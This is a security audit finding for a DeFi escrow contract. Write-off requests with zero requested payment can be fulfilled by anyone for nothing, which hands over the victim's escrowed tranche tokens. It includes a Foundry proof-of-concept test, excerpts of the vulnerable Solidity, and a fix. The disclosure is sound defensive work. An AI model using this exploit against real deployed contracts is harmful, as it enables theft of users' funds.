### Title
Zero-underlying write-off requests let any fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`, while still escrowing the user's tranche tokens. [1](#0-0) [2](#0-1) 

`fullfillWriteOffRequest` only requires `_underlyings >= currentRequest.underlyings`; when the stored request amount is zero, a fulfiller can pass zero and satisfy the request. [3](#0-2) 

The fulfilment then transfers zero underlying, charges a zero fee, sends zero to the requester, and transfers all escrowed tranche tokens to the fulfiller. [4](#0-3) 

### Finding Description
A tranche holder can create a write-off request with a nonzero tranche amount and an empty payment amount during a running epoch. [5](#0-4) 

The public `userRequests` mapping exposes the requester's tranche amount and requested underlying amount to any fulfiller. [6](#0-5) [7](#0-6) 

An attacker can call `fullfillWriteOffRequest(victim, storedTranches, 0)`; the request's `tranches == 0` check passes, the exact tranche count matches, and `0 < storedUnderlyings` is false when the stored amount is zero. [3](#0-2) 

Fulfilment is intentionally callable by any wallet, so no privileged role or Keyring credential is required. [8](#0-7) 

### Impact Explanation
The attacker receives the entire escrowed tranche position without transferring any underlying to the victim. [4](#0-3) 

For example, a malformed request escrowing `100e18` tranche tokens can be fulfilled with `0` underlying, resulting in a direct `100e18` tranche-token theft. [9](#0-8) 

### Likelihood Explanation
The exploit requires a tranche holder to submit a request whose payment field is unset or zero, but the contract gives no protection against that malformed state and lets any unprivileged fulfiller claim it afterward. [5](#0-4) [3](#0-2) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, and add a defense-in-depth check in `fullfillWriteOffRequest` that stored requests always have nonzero underlying consideration. [10](#0-9) [3](#0-2) 

### Proof of Concept
The following Foundry test can run in the existing `IdleCreditVaultWriteOffEscrow` fixture with `writeOffEscrow` initialized and the CDO in a running epoch, which is required for request creation. [11](#0-10) 

```solidity
function testFulfillZeroUnderlyingWriteOff() external {
    IdleCreditVaultWriteOffEscrow escrow =
        IdleCreditVaultWriteOffEscrow(writeOffEscrow);

    require(
        IdleCDOEpochVariant(escrow.idleCDOEpoch()).isEpochRunning(),
        "epoch not running"
    );

    IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
    IERC20Detailed underlyingToken = IERC20Detailed(escrow.underlying());

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    uint256 amount = 100e18;

    // Give the victim tranche tokens and create an unpriced request.
    deal(address(tranche), victim, amount);
    vm.startPrank(victim);
    tranche.approve(address(escrow), amount);
    escrow.createWriteOffRequest(amount, 0);
    vm.stopPrank();

    (uint256 storedTranches, uint256 storedUnderlyings) =
        escrow.userRequests(victim);
    assertEq(storedTranches, amount);
    assertEq(storedUnderlyings, 0);

    // The attacker pays no underlying and receives every escrowed tranche.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(victim, amount, 0);

    assertEq(tranche.balanceOf(attacker), amount);
    assertEq(tranche.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(address(escrow)), 0);
    assertEq(underlyingToken.balanceOf(attacker), 0);
    assertEq(underlyingToken.balanceOf(victim), 0);
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
